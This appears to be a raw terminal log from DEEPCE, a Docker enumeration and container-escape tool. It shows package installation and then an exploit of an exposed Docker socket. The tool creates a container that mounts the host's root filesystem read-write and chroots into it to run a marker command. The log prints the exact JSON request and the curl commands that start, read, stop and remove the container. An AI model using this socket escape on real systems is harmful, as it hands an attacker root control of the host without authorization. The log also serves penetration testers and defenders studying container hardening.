
[1;90m                      ##[1;37m         .
[1;90m                ## ## ##[1;37m        ==
[1;90m             ## ## ## ##[1;37m       ===
[1;37m         /"""""""""""""""""\___/ ===
[1;34m    ~~~ [1;90m{[1;34m~~ ~~~~ ~~~ ~~~~ ~~~ ~[1;90m /  [1;37m===-[1;34m ~~~[0m
[1;90m         \______ X           __/
[1;90m           \    \         __/
[1;90m            \____\_______/[0m
          __                        
     ____/ /__  ___  ____  ________ 
    / __  / _ \/ _ \/ __ \/ ___/ _ \ [1;90m  ENUMERATE[0m
   / /_/ /  __/  __/ /_/ / (__/  __/ [1;90m ESCALATE[0m
   \__,_/\___/\___/ .___/\___/\___/[1;90m  ESCAPE[0m
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter
  
[1;34m===================================[1;32m( Installing Packages )[1;34m====================================[0m
fetch http://dl-cdn.alpinelinux.org/alpine/v3.11/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.11/community/x86_64/APKINDEX.tar.gz
(1/25) Installing fstrm (0.6.0-r1)
7  0%                                             8[0K(2/25) Installing libgcc (9.2.0-r4)
7  0%                                             8[0K(3/25) Installing krb5-conf (1.0-r1)
7  0%                                             8[0K(4/25) Installing libcom_err (1.45.5-r0)
7  0%                                             8[0K(5/25) Installing keyutils-libs (1.6.1-r0)
7  0%                                             8[0K(6/25) Installing libverto (0.3.1-r1)
7  0%                                             8[0K(7/25) Installing krb5-libs (1.17.1-r0)
7  0%                                             8[0K7  1%                                             8[0K7  2% #                                           8[0K7  3% #                                           8[0K7  4% #                                           8[0K7  4% ##                                          8[0K7  7% ###                                         8[0K(8/25) Installing json-c (0.13.1-r1)
7  8% ###                                         8[0K(9/25) Installing libstdc++ (9.2.0-r4)
7  8% ###                                         8[0K(10/25) Installing libprotobuf (3.11.2-r1)
7 14% ######                                      8[0K7 21% #########                                   8[0K(11/25) Installing libprotoc (3.11.2-r1)
7 23% ##########                                  8[0K(12/25) Installing protobuf-c (1.3.2-r3)
7 29% #############                               8[0K(13/25) Installing xz-libs (5.2.4-r0)
7 30% #############                               8[0K(14/25) Installing libxml2 (2.9.10-r3)
7 30% #############                               8[0K(15/25) Installing bind-libs (9.14.12-r0)
7 35% ###############                             8[0K7 36% ###############                             8[0K7 42% ##################                          8[0K7 44% ###################                         8[0K(16/25) Installing bind-tools (9.14.12-r0)
7 44% ###################                         8[0K7 45% ###################                         8[0K7 45% ####################                        8[0K7 46% ####################                        8[0K(17/25) Installing ca-certificates (20191127-r2)
7 47% ####################                        8[0K7 47% #####################                       8[0K7 48% #####################                       8[0K7 49% #####################                       8[0K(18/25) Installing nghttp2-libs (1.40.0-r1)
7 49% #####################                       8[0K(19/25) Installing libcurl (7.67.0-r0)
7 50% ######################                      8[0K(20/25) Installing curl (7.67.0-r0)
7 51% ######################                      8[0K(21/25) Installing lua5.3-libs (5.3.5-r2)
7 52% #######################                     8[0K(22/25) Installing libpcap (1.9.1-r0)
7 53% #######################                     8[0K(23/25) Installing pcre (8.43-r0)
7 54% #######################                     8[0K7 55% ########################                    8[0K(24/25) Installing libssh2 (1.9.0-r1)
7 55% ########################                    8[0K(25/25) Installing nmap (7.80-r1)
7 56% ########################                    8[0K7 64% ############################                8[0K7 66% #############################               8[0K7 67% #############################               8[0K7 70% ###############################             8[0K7 78% ##################################          8[0K7 85% #####################################       8[0K7 88% ######################################      8[0K7 95% ##########################################  8[0K7 97% ##########################################  8[0K7 99% ########################################### 8[0K7100% ############################################8[0KExecuting busybox-1.31.1-r9.trigger
Executing ca-certificates-20191127-r2.trigger
OK: 33 MiB in 39 packages
[1;34m=====================================[1;32m( Exploiting Sock )[1;34m======================================[0m

[1;33m[+][1;32m Preparing Exploit [0m[1;90m [0m
[1;33m[+][1;32m Exploit Type ............. [0m[1;90mCustom Command[0m
[1;33m[+][1;32m Custom Command ........... [0m[1;90mtouch /tmp/deepce-docker-alpine-payload-command.hacked[0m
[1;33m[+][1;32m Clean up ................. [0m[1;90mAutomatic on container exit[0m

{"Image":"alpine","cmd":["/bin/sh","-c","chroot /mnt touch /tmp/deepce-docker-alpine-payload-command.hacked"], "Binds": ["/:/mnt:rw"]}
{"Id":"2ee615aa8f4bf52ac16709158de29a5ada04e9c02971519a5cbbcc74d6aff407","Warnings":[]}
[1;33m[+][1;32m Creating container ..... [0m[1;33m2ee615aa8f4bf52ac16709158de29a5ada04e9c02971519a5cbbcc74d6aff407[0m
[1;33m[+][1;32m If the shell dies you can restart your listener and run the start command to fire it again [0m
[1;90mStart Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/2ee615aa8f4bf52ac16709158de29a5ada04e9c02971519a5cbbcc74d6aff407/start[0m
[1;90mLogs Command: curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/2ee615aa8f4bf52ac16709158de29a5ada04e9c02971519a5cbbcc74d6aff407/logs?stderr=1&stdout=1" --output -[0m
[1;33m[+][1;32m Once complete remember to tidy up by stopping and removing your container with following commands [0m
[1;90mStop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/2ee615aa8f4bf52ac16709158de29a5ada04e9c02971519a5cbbcc74d6aff407/stop[0m
[1;90mRemove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/2ee615aa8f4bf52ac16709158de29a5ada04e9c02971519a5cbbcc74d6aff407[0m
[1;33m[+][1;32m Starting container ..... [0m[1;33mSuccess[0m
[1;33m[+][1;32m Sleeping for ........... [0m[1;90m2s[0m
[1;33m[+][1;32m Fetching logs .......... [0m[1;33mSuccess[0m
[1;33m[+][1;32m Exploit completed ..... [0m[1;33m:)[0m
[1;34m===============================================[1;32m[1;34m===============================================[0m
